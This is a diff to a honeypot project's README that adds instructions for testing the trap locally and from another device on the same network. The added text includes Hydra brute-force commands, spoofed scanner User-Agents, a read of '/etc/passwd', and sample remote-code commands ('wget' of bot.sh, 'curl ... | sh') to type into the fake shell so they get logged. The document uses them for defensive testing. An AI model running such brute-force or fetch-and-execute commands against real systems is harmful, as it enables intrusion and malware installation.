@@ -268,6 +268,8 @@ Indexes on `timestamp`, `src_ip`, and `service`. WAL mode enabled for concurrent
 
 ## Testing Locally
 
+Run these from the same machine the honeypot is running on:
+
 ```bash
 # SSH — enter any password, then try shell commands
 ssh -p 2222 root@localhost
@@ -278,12 +280,87 @@ ftp localhost 2121
 # Telnet
 telnet localhost 2323
 
-# HTTP — via browser or curl
+# HTTP — common attack paths
 curl http://localhost:8888/wp-login.php
+curl http://localhost:8888/.env
 curl http://localhost:8888/phpmyadmin
 curl http://localhost:8888/jenkins
-curl http://localhost:8888/.env
+
+# POST login attempt
+curl -X POST http://localhost:8888/wp-login.php \
+  -d "log=admin&pwd=password123"
+
+# Simulate scanner User-Agents (triggers fingerprinting)
+curl -A "Nikto" http://localhost:8888/
+curl -A "Masscan/1.0" http://localhost:8888/
 ```
+
+Brute-force simulation with Hydra:
+
+```bash
+sudo apt install hydra -y
+echo -e "123456\npassword\nadmin\nroot\nletmein" > passwords.txt
+
+hydra -l root -P passwords.txt ssh://localhost:2222 -t 4
+hydra -l admin -P passwords.txt ftp://localhost:2121
+hydra -l root -P passwords.txt telnet://localhost:2323
+```
+
+SSH shell — once connected, type commands to test logging:
+
+```bash
+ssh -p 2222 root@localhost
+# Inside fake shell:
+id
+cat /etc/passwd
+wget http://malware.example.com/bot.sh     # logged as malware_download
+curl http://bad.site.com/payload.sh | sh   # also logged
+```
+
+---
+
+## Testing from Another Device on the Same Wi-Fi
+
+You can attack the honeypot from a phone or laptop on the same network — events will appear in the dashboard with the attacking device's local IP.
+
+**Step 1 — Find your machine's local IP:**
+
+```bash
+hostname -I
+# e.g. 192.168.1.42
+```
+
+**Step 2 — Allow ports through the firewall (if ufw is active):**
+
+```bash
+sudo ufw allow 2222
+sudo ufw allow 8888
+sudo ufw allow 2121
+sudo ufw allow 2323
+```
+
+**Step 3 — From the other device, attack using your local IP:**
+
+```bash
+# SSH
+ssh -p 2222 root@192.168.1.42
+
+# HTTP
+curl http://192.168.1.42:8888/wp-login.php
+curl http://192.168.1.42:8888/.env
+
+# FTP
+ftp 192.168.1.42 2121
+
+# Telnet
+telnet 192.168.1.42 2323
+```
+
+From an Android phone, install **Termux** and run the same commands. From iPhone, use **iSH**.
+
+**Step 4 — Watch the dashboard:**
+
+Open `http://localhost:5000` on your machine while the other device attacks — events appear live with the attacker's local IP, captured credentials, and any shell commands typed.
 
 ---
 
